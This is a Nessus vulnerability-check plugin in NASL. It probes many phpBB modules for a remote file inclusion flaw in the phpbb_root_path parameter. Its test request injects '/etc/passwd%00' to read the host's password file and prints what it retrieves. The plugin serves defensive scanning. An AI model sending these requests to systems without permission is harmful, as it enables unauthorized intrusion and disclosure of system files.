#
# (C) Tenable Network Security, Inc.
#

if (NASL_LEVEL < 3000) exit(0);

include("compat.inc");

if (description)
{
  script_id(21323);
  script_version("$Revision: 1.26 $");

  script_cve_id(
    "CVE-2006-2245",
    "CVE-2006-5301",
    "CVE-2006-5306",
    "CVE-2006-5390",
    "CVE-2006-5418",
    "CVE-2006-7090",
    "CVE-2006-7100",
    "CVE-2006-7147",
    "CVE-2007-5009",
    "CVE-2007-5100"
  );
  script_bugtraq_id(17822, 20484, 20485, 20493, 20501, 20518, 20525, 20558, 20571, 21171, 25737, 25776);
  script_xref(name:"OSVDB", value:"25263");
  script_xref(name:"OSVDB", value:"29711");
  script_xref(name:"OSVDB", value:"29712");
  script_xref(name:"OSVDB", value:"29713");
  script_xref(name:"OSVDB", value:"29714");
  script_xref(name:"OSVDB", value:"29734");
  script_xref(name:"OSVDB", value:"29751");
  script_xref(name:"OSVDB", value:"31029");
  script_xref(name:"OSVDB", value:"35449");
  script_xref(name:"OSVDB", value:"35450");
  script_xref(name:"OSVDB", value:"38265");
  script_xref(name:"OSVDB", value:"38723");
  script_xref(name:"OSVDB", value:"38724");
  script_xref(name:"OSVDB", value:"38725");

  script_name(english:"phpBB Multiple Module phpbb_root_path Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file using phpBB modules");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
remote file include attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host contains a third-party module for phpBB. 

The version of at least one such component or module installed on the
remote host fails to sanitize input to the 'phpbb_root_path' parameter
before using it to include PHP code.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit these flaws to view arbitrary files on the remote
host or to execute arbitrary PHP code, possibly taken from third-party
hosts." );
 script_set_attribute(attribute:"see_also", value:"http://pridels.blogspot.com/2006/05/phpbb-auction-mod-remote-file.html" );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/2483" );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/2522" );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/2525" );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/2533" );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/2538" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2006-10/0210.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.phpbb.com/phpBB/viewtopic.php?p=2504370&highlight=#2504370" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/452012/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/479997/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.phpbb2.de/ftopic45218.html" );
 script_set_attribute(attribute:"solution", value:
"Disable PHP's 'register_globals' setting or contact the product's
author to see if an upgrade exists." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
 script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("phpbb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Vulnerable scripts.
# - modules
nmods = 0;
mod = make_array();
# -   ACP User Registration
mod[nmods++] = "/includes/functions_mod_user.php";
# -   Admin User Viewed Posts Tracker
mod[nmods++] = "/includes/functions_user_viewed_posts.php";
# -   AI chat (included in PlusXL)
mod[nmods++] = "/mods/iai/includes/constants.php";
# -   Import Tools - Members
mod[nmods++] = "/includes/functions_mod_user.php";
# -   Insert User
mod[nmods++] = "/includes/functions_mod_user.php";
# - Journals System
mod[nmods++] = "/includes/journals_delete.php";
mod[nmods++] = "/includes/journals_edit.php";
mod[nmods++] = "/includes/journals_post.php";
# -   phpBB auction
mod[nmods++] = "/auction/auction_common.php";
# -   phpBB Search Engine Indexer
mod[nmods++] = "/includes/archive/archive_topic.php";
# -   phpBB Security
mod[nmods++] = "/includes/phpbb_security.php";
# -   phpBB2 Plus (not really a mod)
mod[nmods++] = "/language/lang_german/lang_main_album.php";
mod[nmods++] = "/language/lang_german/lang_admin_album.php";
mod[nmods++] = "/language/lang_english/lang_main_album.php";
mod[nmods++] = "/language/lang_english/lang_admin_album.php";
# -   PlusXL itself
mod[nmods++] = "/includes/functions.php";
# -   SpamBlockerMod
mod[nmods++] = "/includes/antispam.php";


info = "";
contents = "";


# Test an install.
install = get_kb_item(string("www/", port, "/phpBB"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  for (i=0; i<nmods; i++)
  {
    r = http_send_recv3(method:"GET", 
     item:string(
        dir, mod[i], "?",
        "phpbb_root_path=", file
      ), 
      port:port
    );
    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream".
      egrep(pattern:"main\(/etc/passwd\\0.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
    {
      info = info +
             "  " + dir + mod[i] + '\n';

      if (!contents && egrep(string:res, pattern:"root:.*:0:[01]:"))
        contents = res - strstr(res, "<br");

      if (!thorough_tests) break;
    }
  }
}

if (info)
{
  if (contents)
    info = string(
      info,
      "\n",
      "And here are the contents of the file '/etc/passwd' that Nessus\n",
      "was able to read from the remote host :\n",
      "\n",
      contents
    );

  report = string(
    "The following scripts(s) are vulnerable :\n",
    "\n",
    info
  );

  security_warning(port:port, extra:report);
}
